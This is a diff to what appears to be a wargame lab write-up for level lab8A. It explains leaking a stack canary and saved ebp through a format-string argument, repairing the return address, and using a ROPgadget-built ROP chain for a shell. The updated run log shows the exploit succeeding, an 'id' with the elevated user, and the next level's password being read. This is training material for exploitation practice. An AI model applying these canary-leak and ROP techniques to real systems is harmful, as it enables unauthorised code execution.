@@ -544,20 +544,21 @@ Th@t_w@5_my_f@v0r1t3_ch@11
   * We can just leak the ebp from the previous function. Both functions take the same number of args so we don't even need to adjust it.
   * Argument `131$`.
 * But now the RA will have the null byte. Luckily the RA is static, so we can just put it back.
+* `ROPgadget` generated rop chain worked to get a shell (statically linked binary).
 * See _lab8A.py_
 
 ```bash
-lab8A@warzone:/levels/lab08$ python /tmp/lab8A.py
+lab8A@warzone:/tmp$ python ./lab8A.py
 [+] Starting program '/levels/lab08/lab8A': Done
-[*] [1197]
+[*] [1145]
 [*] Paused (press any to continue)
 [*] Leaking canary and saved ebp
-[*] Got canary 0x6337ac00
+[*] Got canary 0x25c28100
 [*] Got ebp 0xbffff6b8
-[*] Check is expecting 0xbd9a12ef
-[*] Sending AAAAAAAAAAAAAAAAÔæ≠___\x00\xac7c\xb8ˆˇøx91\x0
-[*] Program '/levels/lab08/lab8A' stopped with exit code 0
-
-    [===] Whew you made it !
-
+[*] Check is expecting 0xfb6f3fef
+[*] Switching to interactive mode
+$ id
+uid=1031(lab8A) gid=1032(lab8A) euid=1032(lab8end) groups=1033(lab8end),1001(gameuser),1032(lab8A)
+$ cat ~lab8end/.pass
+H4x0r5_d0nt_N33d_m3t4pHYS1c5
 ```
